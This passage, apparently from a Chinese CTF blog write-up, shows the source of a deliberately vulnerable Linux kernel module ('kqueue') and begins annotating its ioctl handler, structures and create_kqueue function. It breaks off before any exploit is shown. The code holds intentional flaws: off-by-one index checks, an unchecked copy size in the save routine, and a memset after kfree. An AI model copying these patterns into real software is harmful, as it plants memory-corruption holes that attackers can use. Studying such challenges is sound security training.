class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = validate((<span class=\"type\">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Main queue can also store data */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;data = validate((<span class=\"type\">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Fill the remaining queue structure */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;data_size   = request.data_size;</span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;queue_size  = queue_size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the place from where memory has to be handled */</span></span><br><span class=\"line\">    kqueue_entry = (queue_entry *)((<span class=\"type\">uint64_t</span>)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Allocate all kqueue entries */</span></span><br><span class=\"line\">    queue_entry* current_entry = kqueue_entry;</span><br><span class=\"line\">    queue_entry* prev_entry = current_entry;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;request.max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i!=request.max_entries)</span><br><span class=\"line\">            prev_entry-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        current_entry-&gt;idx = i;</span><br><span class=\"line\">        current_entry-&gt;data = (<span class=\"type\">char</span> *)(validate((<span class=\"type\">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Increment current_entry by size of queue_entry */</span></span><br><span class=\"line\">        current_entry += <span class=\"keyword\">sizeof</span>(queue_entry)/<span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Populate next pointer of the previous entry */</span></span><br><span class=\"line\">        prev_entry-&gt;next = current_entry;</span><br><span class=\"line\">        prev_entry = prev_entry-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Find an appropriate slot in kqueues */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> j = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueues[j] == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(j&gt;MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class=\"line\">    kqueues[j] = <span class=\"built_in\">queue</span>;</span><br><span class=\"line\">    queueCount++;</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">delete_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Check for out of bounds requests */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for existence of the request kqueue */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = kqueues[request.queue_idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">queue</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    kfree(<span class=\"built_in\">queue</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(<span class=\"built_in\">queue</span>,<span class=\"number\">0</span>,<span class=\"built_in\">queue</span>-&gt;queue_size);</span><br><span class=\"line\">    kqueues[request.queue_idx] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">edit_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Check the idx of the kqueue */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if the kqueue exists at that idx */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = kqueues[request.queue_idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">queue</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check the idx of the kqueue entry */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.entry_idx &gt; <span class=\"built_in\">queue</span>-&gt;max_entries)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the kqueue entry memory */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry = (queue_entry *)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for the existence of the kqueue entry */</span></span><br><span class=\"line\">    exists = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;<span class=\"built_in\">queue</span>-&gt;max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">/* If kqueue entry found , do the necessary */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class=\"built_in\">queue</span>-&gt;data_size)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;</span><br><span class=\"line\">                validate(<span class=\"built_in\">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class=\"built_in\">queue</span>-&gt;data_size));</span><br><span class=\"line\">                exists = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.entry_idx==<span class=\"number\">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class=\"built_in\">queue</span>-&gt;data_size)&#123;</span><br><span class=\"line\">        validate(<span class=\"built_in\">memcpy</span>(<span class=\"built_in\">queue</span>-&gt;data,request.data,<span class=\"built_in\">queue</span>-&gt;data_size));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!exists)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> NOT_EXISTS;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Now you have the option to safely preserve your precious kqueues */</span></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">save_kqueue_entries</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for out of bounds queue_idx requests */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if queue is already saved or not */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(isSaved[request.queue_idx]==<span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Queue already saved&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.max_entries &lt; <span class=\"number\">1</span> || request.max_entries &gt; <span class=\"built_in\">queue</span>-&gt;max_entries)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Allocate memory for the kqueue to be saved */</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *new_queue = validate((<span class=\"type\">char</span> *)kzalloc(<span class=\"built_in\">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Each saved entry can have its own size */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.data_size &gt; <span class=\"built_in\">queue</span>-&gt;queue_size)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class=\"line\">        validate(<span class=\"built_in\">memcpy</span>(new_queue,<span class=\"built_in\">queue</span>-&gt;data,request.data_size));</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Internal error&quot;</span>);</span><br><span class=\"line\">    new_queue += <span class=\"built_in\">queue</span>-&gt;data_size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the entries of the kqueue */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry = (queue_entry *)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* copy all possible kqueue entries */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;request.max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class=\"line\">            validate(<span class=\"built_in\">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            err(<span class=\"string\">&quot;[-] Internal error&quot;</span>);</span><br><span class=\"line\">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class=\"line\">        new_queue += <span class=\"built_in\">queue</span>-&gt;data_size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Mark the queue as saved */</span></span><br><span class=\"line\">    isSaved[request.queue_idx] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> GCC pop_options</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __init <span class=\"title function_\">init_kqueue</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">    mutex_init(&amp;operations_lock);</span><br><span class=\"line\">    reg = misc_register(&amp;kqueue_device);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(reg &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        mutex_destroy(&amp;operations_lock);</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Failed to register kqueue&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __exit <span class=\"title function_\">exit_kqueue</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">    misc_deregister(&amp;kqueue_device);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">module_init(init_kqueue);</span><br><span class=\"line\">module_exit(exit_kqueue);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>代码比较场我们一点点分析</p>\n<h3 id=\"kqueue_ioctl\"><a class=\"markdownIt-Anchor\" href=\"#kqueue_ioctl\">#</a> kqueue_ioctl</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">kqueue_ioctl</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *file, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> cmd, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">long</span> result;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">request_t</span> request;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mutex_lock(&amp;operations_lock);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (copy_from_user((<span class=\"type\">void</span> *)&amp;request, (<span class=\"type\">void</span> *)arg, <span class=\"keyword\">sizeof</span>(<span class=\"type\">request_t</span>)))&#123;</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(cmd)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> CREATE_KQUEUE:</span><br><span class=\"line\">            result = create_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> DELETE_KQUEUE:</span><br><span class=\"line\">            result = delete_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> EDIT_KQUEUE:</span><br><span class=\"line\">            result = edit_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SAVE:</span><br><span class=\"line\">            result = save_kqueue_entries(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            result = INVALID;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">ret: </span><br><span class=\"line\">    mutex_unlock(&amp;operations_lock);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ioctl 函数，用于我们与设备的通信。首先会从用户态拷贝 request 的数据。一些重要结构体的定义如下</p>\n<h3 id=\"结构体\"><a class=\"markdownIt-Anchor\" href=\"#结构体\">#</a> 结构体</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> max_entries;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> data_size;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> entry_idx;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> queue_idx;</span><br><span class=\"line\">    <span class=\"type\">char</span>* data;</span><br><span class=\"line\">&#125;<span class=\"type\">request_t</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> data_size;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> queue_size; <span class=\"comment\">/* This needs to handle larger numbers */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> max_entries;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> idx;</span><br><span class=\"line\">    <span class=\"type\">char</span>* data;</span><br><span class=\"line\">&#125;<span class=\"built_in\">queue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">queue_entry</span> <span class=\"title\">queue_entry</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">queue_entry</span>&#123;</span>\t\t\t\t\t\t<span class=\"comment\">//队列的节点</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> idx;\t\t\t\t\t\t<span class=\"comment\">//节点的位置</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *data;</span><br><span class=\"line\">    queue_entry *next;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>然后就是根据我们输入的 cmd 进行操作，可以看到是我们熟悉的增删改操作。</p>\n<h3 id=\"create_kqueue\"><a class=\"markdownIt-Anchor\" href=\"#create_kqueue\">#</a> create_kqueue</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">create_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">long</span> result = INVALID;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(queueCount &gt; MAX_QUEUES)\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">//MAX_QUEUES= 5</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Max queue count reached&quot;</span>);\t\t\t\t\t<span class=\"comment\">//限制创建的数目为5</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.max_entries&lt;<span class=\"number\">1</span>)\t\t\t\t\t\t\t\t<span class=\"comment\">//我们创建的队列至少有一个节点</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Asking for too much is also not good */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.data_size&gt;MAX_DATA_SIZE)\t\t\t\t\t\t<span class=\"comment\">//限制data的数据大小为0x20</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Initialize kqueue_entry structure */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry;\t\t\t\t\t\t\t\t<span class=\"comment\">//初始化节点指针</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class=\"line\">    ull space = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(__builtin_umulll_overflow(<span class=\"keyword\">sizeof</span>(queue_entry),(request.max_entries+<span class=\"number\">1</span>),&amp;space) == <span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Integer overflow&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//Gcc 的内部函数，space= sizeof(queue_entry) * (request.max_entries+1)；每一个entry可以理解为一个node</span></span><br><span class=\"line\">    <span class=\"comment\">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class=\"line\">    ull queue_size = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(__builtin_saddll_overflow(<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>),space,&amp;queue_size) == <span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Integer overflow&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//Gcc 的内部函数，queue_size = sizeof(queue) + space</span></span><br><span class=\"line\">    <span class=\"comment\">/* Total size should not exceed a certain limit */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(queue_size&gt;<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>) + <span class=\"number\">0x10000</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* All checks done , now call kzalloc */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = validate((<span class=\"type\">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class=\"line\"><span class=\"comment\">//创建队列，queue_size = sizeof(queue_entry) * (request.max_entries+1) + sizeof(queue)；</span></span><br><span class=\"line\">    <span class=\"comment\">/* Main queue can also store data */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;data = validate((<span class=\"type\">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Fill the remaining queue structure */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;data_size   = request.data_size;</span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;queue_size  = queue_size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the place from where memory has to be handled */</span></span><br><span class=\"line\">    kqueue_entry = (queue_entry *)((<span class=\"type\">uint64_t</span>)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>));<span class=\"comment\">//(&amp;queue+0x18)指向的是第一个节点的位置</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Allocate all kqueue entries */</span></span><br><span class=\"line\">    queue_entry* current_entry = kqueue_entry;</span><br><span class=\"line\">    queue_entry* prev_entry = current_entry;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;request.max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i!=request.max_entries)</span><br><span class=\"line\">            prev_entry-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        current_entry-&gt;idx = i;</span><br><span class=\"line\">        current_entry-&gt;data = (<span class=\"type\">char</span> *)(validate((<span class=\"type\">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Increment current_entry by size of queue_entry */</span></span><br><span class=\"line\">        current_entry += <span class=\"keyword\">sizeof</span>(queue_entry)/<span class=\"number\">16</span>;\t\t\t<span class=\"comment\">//（queue_entry *）current_entry +=1，指向下一个结构体，所有的节点在queue空间是线性的，所以这个queue的空间其实就是queue(队列头信息) + n*queue_entry,</span></span><br><span class=\"line\">    